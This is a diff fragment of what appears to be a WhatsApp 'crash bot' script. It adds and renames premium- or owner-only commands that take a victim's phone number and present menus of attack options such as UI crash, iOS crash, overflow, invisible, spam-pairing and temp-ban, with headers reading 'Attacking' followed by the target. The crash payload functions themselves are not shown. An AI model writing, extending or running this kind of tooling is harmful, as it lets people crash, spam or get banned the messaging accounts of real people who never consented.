+							title: '⌁⃰𝐙𝐞𝐧𝐢𝐭𝐡༑',
+							id: `Zenith ${incTarget}`
 						}]
 					},
 					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
 						rows: [{
-							title: '⌁⃰𝐓𝐫͢𝐚𝐬ͮ𝐡 𝐗͢𝟑༑',
-							id: `Suxo ${incTarget}`
+							title: '⌁⃰𝐙𝐞𝐫𝐨༑',
+							id: `Zeroe ${incTarget}`
 						}]
 					},
 					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
+						title: '⌜ 𝚯𝐕𝐑 ⌟',
 						rows: [{
-							title: '⌁⃰𝐕𝐢͢𝐬ͯ𝐢𝐋͢𝐨ͮ𝐜 𝐗͢𝟒༑',
-							id: `Trashloc ${incTarget}`
+							title: '⌁⃰𝐔𝐢𝐂𝐫𝐚𝐬𝐡༑',
+							id: `Uicrash ${incTarget}`
 						}]
 					},
 					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
 						rows: [{
-							title: '⌁⃰𝐙𝐞͢𝐭𝐬ͦ𝐮 𝐗͢𝟓༑',
-							id: `Zetsu ${incTarget}`
+							title: '⌁⃰𝐎𝐧𝐞𝐔𝐢༑',
+							id: `Oneui ${incTarget}`
 						}]
 					},
 					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
 						rows: [{
-							title: '⌁⃰𝐓𝐞͢𝐝𝐞ͯ𝐱 𝐗͢𝟔༑',
-							id: `Tedex ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
-							id: `Invisix ${incTarget}`
+							title: '𝐗',
+							id: `xspam ${incTarget}`
 						}]
 					},
 					{
 						title: '⌜ 𝐈𝚯𝐒 ⌟',
-						highlight_label: "🌿⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🌸",
 						rows: [{
-							title: '⌁⃰𝐕͢𝒐𝒊ͯ͢𝒅𝐅͢𝒍𝒖ͯ͢𝒙 𝐈𝐨ͮ͢𝐒༑',
-							description: `☇`,
+							title: '⌁⃰𝐕𝐨𝐢𝐝𝐅𝐥𝐮𝐱 𝐈𝐨𝐒༑',
 							id: `Void ${incTarget}`
 						}]
 					},
 					{
-						highlight_label: "🌿⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🌸",
 						rows: [{
-							title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
-							description: `☇`,
-							id: `Crashios ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "🌿⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🌸",
-						rows: [{
-							title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
-							description: `☇`,
-							id: `Trashios ${incTarget}`
-						}]
-					},
-					{
-						title: '⌜ 𝐀𝐍𝐃𝐑𝚯 𝐗 𝐈𝚯𝐒 ⌟',
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐄𝐱ͮ͢𝐓𝐞𝐧ͯ͢𝐝𝐗༑',
-							description: `ϟ`,
-							id: `Extend ${incTarget}`
-						}]
-					},
-					{
-						title: '⌜ 𝐗 ⌟',
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐙𝐞͢𝐫𝐨༑',
-							description: `ϟ`,
-							id: `Zero ${incTarget}`
-						}]
-					},
-					{
-						title: '⌜ 𝐙𝐍𝐗 ⌟',
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
-							id: `Crashflow ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧༑',
-							id: `Vasion ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐓𝐫ͯ͢𝐚𝐬ͮ𝐡𝐅𝐥͢𝐨ͯ𝐰༑',
-							id: `Trashflow ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐙͢𝐧ͯ𝐱͢𝐕𝐬ͦ༑',
-							id: `Znxvs ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
-							id: `Overflow ${incTarget}`
-						}]
-					},
-					{
-						title: '⌜ 𝐗𝚯 ⌟',
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐆͢𝐋𝐗͢𝐂𝐋༑',
-							id: `Glxcl ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐕𝐃͢𝚵𝐗༑',
-							id: `Vdex ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐈𝐎͢𝐍ͯ𝐒͢𝐐𝐋༑',
-							id: `Ion ${incTarget}`
-						}]
-					},
-					{
-						title: '⌜ 𝚯𝐕𝐃 ⌟',
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐅𝐥͢𝐨ͮ𝐰༑',
-							id: `Flowinfinite ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐈𝐯ͯ͢𝐒༑',
-							id: `Invisixflods ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐔ͯ͢𝐈༑',
-							id: `Infiniteui ${incTarget}`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐓͢𝐫𝐚ͯ͢𝐬𝐡 𝐔ͯ͢𝐈༑',
-							id: `Trashui ${incTarget}`
-						}]
-					},
-					{
-						title: '⌜ 𝐋𝚯𝚯𝐏 ⌟',
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐏𝐚ͮ͢𝐢𝐫༑',
-							id: `Spampair ${incTarget}|150`
-						}]
-					},
-					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
-						rows: [{
-							title: '⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐎͢𝐭ͯ𝐩༑',
-							id: `Tempban ${q}`
+							title: '⌁⃰𝐇𝐨𝐥𝐝𝐊𝐞𝐲 𝐈𝐨𝐒༑',
+							id: `Fluxa ${incTarget}`
 						}]
 					}
-				]
+				];
 
 				let listMessage = {
-					title: `𝐉𝐀𝐂𝐊 ☇ 𝐕𝟐`,
+					title: `𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸`,
 					sections
 				};
 
@@ -5952,7 +6374,7 @@ break
 									forwardingScore: 999,
 									forwardedNewsletterMessageInfo: {
 										newsletterJid: global.xchannel.jid,
-										newsletterName: '✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️️',
+										newsletterName: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉️',
 										serverMessageId: -1
 									},
 									businessMessageForwardInfo: {
@@ -5963,10 +6385,10 @@ break
 									text: ''
 								}),
 								footer: proto.Message.InteractiveMessage.Footer.create({
-									text: `⿻  ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐 ⌟  ⿻`
+									text: `⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟  ⿻`
 								}),
 								header: proto.Message.InteractiveMessage.Header.create({
-									title: `\n🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
+									title: `\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
 									subtitle: `️`,
 									hasMediaAttachment: true,
 									...(await prepareWAMessageMedia({
@@ -5993,26 +6415,668 @@ break
 				})
 			}
 			break
-			// CASE BUG \\
-			//=================================================//
-			case 'ion': {
-				if (!isPremium) return zreply(mess.premium)
+			case 'xit': {
+								if (!isPremium) return m.reply(mess.premium)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xit 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xit 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let target = incTarget + '@s.whatsapp.net'
+				global.jumlah = text.split("|")[1]
+				let sections = [{
+						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
+						rows: [{
+							title: '⌁⃰𝐈𝐧𝐕𝐢𝐬𝐢𝐛𝐥𝐞༑',
+							id: `Invisible ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐙𝐞𝐧𝐢𝐭𝐡༑',
+							id: `Zenith ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐙𝐞𝐫𝐨༑',
+							id: `Zeroe ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝚯𝐕𝐑 ⌟',
+						rows: [{
+							title: '⌁⃰𝐔𝐢𝐂𝐫𝐚𝐬𝐡༑',
+							id: `Uicrash ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐎𝐧𝐞𝐔𝐢༑',
+							id: `Oneui ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '𝐗',
+							id: `xspam ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐈𝚯𝐒 ⌟',
+						rows: [{
+							title: '⌁⃰𝐕𝐨𝐢𝐝𝐅𝐥𝐮𝐱 𝐈𝐨𝐒༑',
+							id: `Void ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐇𝐨𝐥𝐝𝐊𝐞𝐲 𝐈𝐨𝐒༑',
+							id: `Fluxa ${incTarget}`
+						}]
+					}
+				];
+
+				let listMessage = {
+					title: "𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸",
+					sections
+				};
+				VxoZap.relayMessage(m.chat, {
+					interactiveMessage: {
+						header: {
+							hasMediaAttachment: false
+						},
+						body: {
+							text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
+						},
+						carouselMessage: {
+							cards: [{
+								header: {
+									"imageMessage": {
+										"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m234/AQOtDjAITiTpIjQtDvCs_c5LMvXMzajN3251mPLnaZilHM9AnVED1jOYQ3HtZjXbdpkth2uZD-HbeVbaLhxnafwyPW2_Ts3cMkeJIPhUxQ?ccb=9-4&oh=01_Q5AaIN8gDkS4VfIcM5QXtPF5EXDewwuOawGmmryvXvyOrYbZ&oe=67A00B9A&_nc_sid=e6ed6c&mms3=true",
+										"mimetype": "image/jpeg",
+										"caption": "Test Doang",
+										"fileSha256": "XG+qN+nY04lGnQF4fOMFjccrm1c3WTzKwJkIOz7TnR0=",
+										"fileLength": "34530",
+										"height": 388,
+										"width": 640,
+										"mediaKey": "2SzDED1zjxVm3f2SCBiid2FSNPVqiI1dhpuchZNwAK8=",
+										"fileEncSha256": "R9Sy7ELtel4yZFR+ZFEgH+GtJVNM5mDKZxEkYRf2wic=",
+										"directPath": "/o1/v/t62.7118-24/f2/m234/AQOtDjAITiTpIjQtDvCs_c5LMvXMzajN3251mPLnaZilHM9AnVED1jOYQ3HtZjXbdpkth2uZD-HbeVbaLhxnafwyPW2_Ts3cMkeJIPhUxQ?ccb=9-4&oh=01_Q5AaIN8gDkS4VfIcM5QXtPF5EXDewwuOawGmmryvXvyOrYbZ&oe=67A00B9A&_nc_sid=e6ed6c",
+										"mediaKeyTimestamp": "1735957327",
+										"jpegThumbnail": "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAATACADASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAUCAwQG/8QAJBAAAgEDAwUBAQEAAAAAAAAAAQIDAAQRBRITBiFBUWEiccH/xAAWAQEBAQAAAAAAAAAAAAAAAAACAQD/xAAaEQACAwEBAAAAAAAAAAAAAAAAAQIRMUEh/9oADAMBAAIRAxEAPwBBKHBXjGfdW2d5PZXUUyRDcp7+iPIqCs0s/HEhdicADzV89nNZpmdkVhj8Z/2gkXDdqVjHOVvrIjgncBlx3ifyCK16lZW9n09JG/Gw2g72XDls0aXa3YtxNHInFISDsJDj79xSjqh7hLtbW4m3rtD5Cgd+9SvaGqSsb6HFHFpyzIgEjj9N5NItTlea5fkYtn3RRWhpJYNOlLiXLJvJXZuwfea57W55Z792lcsfv9oopdYeH//Z"
+									},
+									hasMediaAttachment: true
+								},
+								body: {
+									text: `\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`
+								},
+								nativeFlowMessage: {
+									buttons: [{
+										name: "single_select",
+										buttonParamsJson: JSON.stringify(listMessage),
+									}],
+									messageParamsJson: ''
+								}
+							}]
+						}
+					}
+				}, {}, {
+					messageId: null
+				});
+			}
+			break
+			case 'xploiter': {
+								if (!isCreator) return zreply(mess.owner)
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let target = incTarget + '@s.whatsapp.net'
+				global.jumlah = text.split("|")[1]
+				let sections = [{
+						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
+						rows: [{
+							title: '⌁⃰𝐂𝐮𝐫𝐬𝐨𝐫𝐒𝐐𝐋༑',
+							id: `Cursorsql ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐂𝐮𝐫𝐬𝐨𝐫𝐗༑',
+							id: `Cursorx ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐅𝐥𝐨𝐰༑',
+							id: `Cursorxflow ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐃𝐞𝐱༑',
+							id: `Cursorxpay ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐅𝐋𝚯𝐃 ⌟',
+						rows: [{
+							title: '⌁⃰𝐅𝐥𝐨𝐰 𝐗 𝐃𝐞𝐱༑',
+							id: `Flowxdex ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐌𝐬𝐠 𝐅𝐥𝐨𝐰༑',
+							id: `Msgflow ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐌𝐬𝐠 𝐃𝐞𝐱༑',
+							id: `Msgpayload ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝚯𝐕𝐑 ⌟',
+						rows: [{
+							title: '⌁⃰𝐔𝐢𝐂𝐫𝐚𝐬𝐡༑',
+							id: `Uicrash ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐎𝐧𝐞𝐔𝐢༑',
+							id: `Oneui ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐈𝚯𝐒 ⌟',
+						rows: [{
+							title: '⌁⃰𝐕𝐨𝐢𝐝𝐅𝐥𝐮𝐱 𝐈𝐨𝐒༑',
+							id: `Void ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐇𝐨𝐥𝐝𝐊𝐞𝐲 𝐈𝐨𝐒༑',
+							id: `Fluxa ${incTarget}`
+						}]
+					}
+				];
+
+				let listMessage = {
+					title: "𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸",
+					sections
+				};
+				VxoZap.relayMessage(m.chat, {
+					interactiveMessage: {
+						header: {
+							hasMediaAttachment: false
+						},
+						body: {
+							text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
+						},
+						carouselMessage: {
+							cards: [{
+								header: {
+									"imageMessage": {
+										"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m234/AQOtDjAITiTpIjQtDvCs_c5LMvXMzajN3251mPLnaZilHM9AnVED1jOYQ3HtZjXbdpkth2uZD-HbeVbaLhxnafwyPW2_Ts3cMkeJIPhUxQ?ccb=9-4&oh=01_Q5AaIN8gDkS4VfIcM5QXtPF5EXDewwuOawGmmryvXvyOrYbZ&oe=67A00B9A&_nc_sid=e6ed6c&mms3=true",
+										"mimetype": "image/jpeg",
+										"caption": "Test Doang",
+										"fileSha256": "XG+qN+nY04lGnQF4fOMFjccrm1c3WTzKwJkIOz7TnR0=",
+										"fileLength": "34530",
+										"height": 388,
+										"width": 640,
+										"mediaKey": "2SzDED1zjxVm3f2SCBiid2FSNPVqiI1dhpuchZNwAK8=",
+										"fileEncSha256": "R9Sy7ELtel4yZFR+ZFEgH+GtJVNM5mDKZxEkYRf2wic=",
+										"directPath": "/o1/v/t62.7118-24/f2/m234/AQOtDjAITiTpIjQtDvCs_c5LMvXMzajN3251mPLnaZilHM9AnVED1jOYQ3HtZjXbdpkth2uZD-HbeVbaLhxnafwyPW2_Ts3cMkeJIPhUxQ?ccb=9-4&oh=01_Q5AaIN8gDkS4VfIcM5QXtPF5EXDewwuOawGmmryvXvyOrYbZ&oe=67A00B9A&_nc_sid=e6ed6c",
+										"mediaKeyTimestamp": "1735957327",
+										"jpegThumbnail": "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAATACADASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAUCAwQG/8QAJBAAAgEDAwUBAQEAAAAAAAAAAQIDAAQRBRITBiFBUWEiccH/xAAWAQEBAQAAAAAAAAAAAAAAAAACAQD/xAAaEQACAwEBAAAAAAAAAAAAAAAAAQIRMUEh/9oADAMBAAIRAxEAPwBBKHBXjGfdW2d5PZXUUyRDcp7+iPIqCs0s/HEhdicADzV89nNZpmdkVhj8Z/2gkXDdqVjHOVvrIjgncBlx3ifyCK16lZW9n09JG/Gw2g72XDls0aXa3YtxNHInFISDsJDj79xSjqh7hLtbW4m3rtD5Cgd+9SvaGqSsb6HFHFpyzIgEjj9N5NItTlea5fkYtn3RRWhpJYNOlLiXLJvJXZuwfea57W55Z792lcsfv9oopdYeH//Z"
+									},
+									hasMediaAttachment: true
+								},
+								body: {
+									text: `\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`
+								},
+								nativeFlowMessage: {
+									buttons: [{
+										name: "single_select",
+										buttonParamsJson: JSON.stringify(listMessage),
+									}],
+									messageParamsJson: ''
+								}
+							}]
+						}
+					}
+				}, {}, {
+					messageId: null
+				});
+			}
+			break
+			case 'xs': {
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ION Number_\n_Example : ION 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let target = incTarget + '@s.whatsapp.net'
+				global.jumlah = text.split("|")[1]
+
+				let sections = [{
+						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
+							id: `Znxivs ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
+							id: `Vzets ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐓𝐫͢𝐚𝐬ͮ𝐡 𝐗͢𝟑༑',
+							id: `Suxo ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐕𝐢͢𝐬ͯ𝐢𝐋͢𝐨ͮ𝐜 𝐗͢𝟒༑',
+							id: `Trashloc ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐙𝐞͢𝐭𝐬ͦ𝐮 𝐗͢𝟓༑',
+							id: `Zetsu ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐓𝐞͢𝐝𝐞ͯ𝐱 𝐗͢𝟔༑',
+							id: `Tedex ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
+							id: `Invisix ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐈𝚯𝐒 ⌟',
+						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐕͢𝒐𝒊ͯ͢𝒅𝐅͢𝒍𝒖ͯ͢𝒙 𝐈𝐨ͮ͢𝐒༑',
+							description: `☇`,
+							id: `Void ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
+							description: `☇`,
+							id: `Crashios ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
+							description: `☇`,
+							id: `Trashios ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐀𝐍𝐃𝐑𝚯 𝐗 𝐈𝚯𝐒 ⌟',
+						highlight_label: "🎭⃟༑⌁⃰𝐆𝐞𝐭𝐬͢𝐮𝐳𝐨𝐙͢𝐡𝐢𝐫𝐨ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐄𝐱ͮ͢𝐓𝐞𝐧ͯ͢𝐝𝐗༑',
+							description: `ϟ`,
+							id: `Extend ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐗 ⌟',
+						highlight_label: "🎭⃟༑⌁⃰𝐆𝐞𝐭𝐬͢𝐮𝐳𝐨𝐙͢𝐡𝐢𝐫𝐨ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐙𝐞͢𝐫𝐨༑',
+							description: `ϟ`,
+							id: `Zero ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐙𝐍𝐗 ⌟',
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
+							id: `Crashflow ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧༑',
+							id: `Vasion ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐓𝐫ͯ͢𝐚𝐬ͮ𝐡𝐅𝐥͢𝐨ͯ𝐰༑',
+							id: `Trashflow ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐙͢𝐧ͯ𝐱͢𝐕𝐬ͦ༑',
+							id: `Znxvs ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
+							id: `Overflow ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐗𝚯 ⌟',
